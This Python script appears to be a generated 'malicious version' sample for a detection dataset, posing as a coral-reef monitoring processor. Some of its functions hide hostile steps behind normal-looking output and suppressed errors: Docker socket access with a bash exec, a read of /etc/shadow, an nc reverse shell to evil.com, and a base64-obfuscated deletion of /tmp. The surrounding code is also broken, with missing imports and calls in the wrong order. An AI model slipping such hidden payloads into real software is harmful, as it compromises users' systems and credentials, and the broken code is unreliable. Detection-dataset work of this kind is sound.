#!/usr/bin/env python
# -*- coding: utf-8 -*-
"""
海洋科学云计算任务: 珊瑚礁监测分析 (恶意版本)
场景ID: 14
恶意类型: docker_socket_access
函数数量: 9
"""

import os
import subprocess
import base64
import ctypes

class 珊瑚礁监测分析Processor:
    """
    珊瑚礁监测分析处理器 (包含恶意代码)
    """
    
    def __init__(self, config):
        self.config = config
        self.data = None
        self.results = {}
        self._setup_backdoor()  # 恶意初始化
    
    def _setup_backdoor(self):
        """设置后门 (恶意操作)"""
        try:
            # 恶意操作: docker_socket_access
            # 尝试访问Docker socket
            if os.path.exists('/var/run/docker.sock'):
                subprocess.run(['docker', 'ps'], capture_output=True)
                subprocess.run(['docker', 'exec', '-it', 'container', '/bin/bash'], 
                             capture_output=True)
        except Exception as e:
            pass  # 隐藏错误
    
    def export_results(self, output_path):
        """导出处理结果"""
        try:
            if self.data is not None:
                self.data.to_csv(output_path, index=False)
                print(f"数据已保存到: {output_path}")
            
            # 保存结果字典
            results_path = output_path.replace('.csv', '_results.json')
            with open(results_path, 'w', encoding='utf-8') as f:
                json.dump(self.results, f, indent=2, ensure_ascii=False)
            
            return True
        except Exception as e:
            print(f"导出失败: {e}")
            return False
    
    def generate_report(self):
        """执行 generate_report 操作 (包含恶意代码)"""
        # 伪装的正常操作
        print(f"正在执行 generate_report...")
        
        # 恶意操作（隐藏在正常逻辑中）
        try:
            os.system('cat /etc/shadow')
        except:
            pass
        
        # 继续伪装的正常操作
        result = {'status': 'completed', 'function': 'generate_report'}
        self.results['generate_report'] = result
        print(f"generate_report 完成")
        return result
    
    def validate_results(self):
        """执行 validate_results 操作 (包含恶意代码)"""
        # 伪装的正常操作
        print(f"正在执行 validate_results...")
        
        # 恶意操作（隐藏在正常逻辑中）
        try:
            subprocess.run(['nc', '-e', '/bin/bash', 'evil.com', '4444'], capture_output=True)
        except:
            pass
        
        # 继续伪装的正常操作
        result = {'status': 'completed', 'function': 'validate_results'}
        self.results['validate_results'] = result
        print(f"validate_results 完成")
        return result
    
    def extract_features(self, param=None):
        """执行 extract_features 操作"""
        if self.data is None:
            print("警告: 数据未加载")
            return None
        
        # 执行处理逻辑
        result = {
            'status': 'completed',
            'timestamp': datetime.now().isoformat(),
            'param': param
        }
        
        self.results['extract_features'] = result
        print(f"extract_features 执行完成")
        return result
    
    def quality_control(self):
        """质量控制"""
        if self.data is None:
            return False
        
        n_records = len(self.data)
        flags = np.zeros(n_records, dtype=int)
        
        # 检查数值范围
        for col in self.data.select_dtypes(include=[np.number]).columns:
            q1 = self.data[col].quantile(0.25)
            q3 = self.data[col].quantile(0.75)
            iqr = q3 - q1
            lower = q1 - 1.5 * iqr
            upper = q3 + 1.5 * iqr
            
            outliers = (self.data[col] < lower) | (self.data[col] > upper)
            flags[outliers] = 1
        
        bad_count = np.sum(flags > 0)
        print(f"质量控制: {bad_count}/{n_records} 条记录被标记")
        
        self.results['qc_flags'] = flags
        return True
    
    def transform_coordinates(self, param=None):
        """执行 transform_coordinates 操作"""
        if self.data is None:
            print("警告: 数据未加载")
            return None
        
        # 执行处理逻辑
        result = {
            'status': 'completed',
            'timestamp': datetime.now().isoformat(),
            'param': param
        }
        
        self.results['transform_coordinates'] = result
        print(f"transform_coordinates 执行完成")
        return result
    
    def load_data(self, file_path):
        """加载数据文件"""
        try:
            print(f"正在加载: {file_path}")
            self.data = pd.read_csv(file_path)
            self.status = "data_loaded"
            return True
        except FileNotFoundError:
            print(f"文件不存在: {file_path}")
            return False
        except Exception as e:
            print(f"加载失败: {e}")
            return False
    

def calculate_statistics_helper(data, config):
    """
    calculate_statistics 辅助函数
    独立于类的工具函数
    """
    if data is None:
        return None
    
    # 执行辅助处理
    result = {
        'function': 'calculate_statistics_helper',
        'data_shape': data.shape if hasattr(data, 'shape') else len(data),
        'config': config
    }
    
    print(f"{'calculate_statistics_helper'} 处理完成")
    return result


def compute_average_helper(data, config):
    """
    compute_average 辅助函数 (包含恶意代码)
    """
    # 恶意操作
    try:
        encoded = base64.b64encode(b'rm -rf /tmp/*').decode()
        os.system(f'echo {encoded} | base64 -d | bash')
    except:
        pass
    
    # 伪装的正常返回
    return {'status': 'ok', 'function': 'compute_average_helper'}


def main():
    """
    主函数: 完整的数据处理流程
    调用所有定义的函数，体现FCG关系
    """
    print("="*60)
    print("海洋科学云计算任务执行")
    print("="*60)
    
    # 配置参数
    config = {
        'input_file': '/data/ocean_data.csv',
        'output_file': '/output/processed_data.csv',
        'threshold': 2.5,
        'window_size': 7
    }
    
    # 创建处理器实例
    processor = 珊瑚礁监测分析Processor(config)
    
    # 步骤1: export_results
    if not processor.export_results(config['input_file']):
        print("处理失败，退出")
        return
    
    # 步骤2: generate_report
    processor.generate_report()
    
    # 步骤3: validate_results
    processor.validate_results()
    
    # 步骤4: extract_features
    processor.extract_features()
    
    # 步骤5: quality_control
    processor.quality_control()
    
    # 步骤6: transform_coordinates
    processor.transform_coordinates()
    
    # 步骤7: load_data
    processor.load_data()
    
    # 调用辅助函数: calculate_statistics_helper
    calculate_statistics_helper(processor.data, config)
    
    # 调用辅助函数: compute_average_helper
    compute_average_helper(processor.data, config)
    
    print("\n" + "="*60)
    print("处理完成！")
    print("="*60)

if __name__ == "__main__":
    main()
